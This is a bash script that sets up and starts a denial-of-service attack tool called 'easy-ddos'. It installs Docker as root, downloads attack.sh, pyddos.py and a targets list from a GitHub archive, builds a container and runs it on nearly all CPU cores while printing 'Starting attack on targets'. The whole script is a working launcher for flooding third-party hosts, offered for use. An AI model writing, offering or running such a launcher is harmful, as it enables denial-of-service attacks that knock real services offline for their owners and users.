#!/bin/bash

REPO_NAME=easy-ddos
ACTUAL_TAG=master

URL="https://github.com/julfy/$REPO_NAME/archive/refs/heads/$ACTUAL_TAG.zip"
# from tag: URL="https://github.com/julfy/$REPO_NAME/archive/refs/tags/$ACTUAL_TAG.zip"

# Install docker
if [[ -z "$(which docker)" ]]; then
    curl -fsSL https://get.docker.com -o get-docker.sh
    sudo sh get-docker.sh
    rm get-docker.sh
fi
sudo systemctl start docker

# Download or update
if [[ $1 = '-u' || ! -f 'Dockerfile' ]]; then
    curl -L --output "$ACTUAL_TAG.zip" "$URL"
    # or wget -q "$URL"

    # Extract
    unzip -o "$ACTUAL_TAG.zip"
    mv "$REPO_NAME-$ACTUAL_TAG/Dockerfile" .
    mv "$REPO_NAME-$ACTUAL_TAG/attack.sh" .
    mv "$REPO_NAME-$ACTUAL_TAG/pyddos.py" .
    mv "$REPO_NAME-$ACTUAL_TAG/targets.txt" .

    # Cleanup
    rm -rf "$ACTUAL_TAG.zip" "$REPO_NAME-$ACTUAL_TAG"
fi

# TODO: Select random/all targets

# Build docker image
sudo docker build --no-cache --tag $REPO_NAME .

# Start
echo ""
echo "Starting attack on targets: "
cat targets.txt
echo ""
CPUS=$[$(nproc --all) - 1]; (($CPUS)) || CPUS=1  # use <total CPU cores> - 1 but not less than 1
CONTAINER_ID=$(sudo docker run -m 100m --cpus $CPUS -d "$REPO_NAME")

# Wait for input
read -n 1 -p "Press any key to stop"
echo " Stopping..."

# Stop
sudo docker rm $(sudo docker stop $CONTAINER_ID) > /dev/null

echo 'Stopped.'
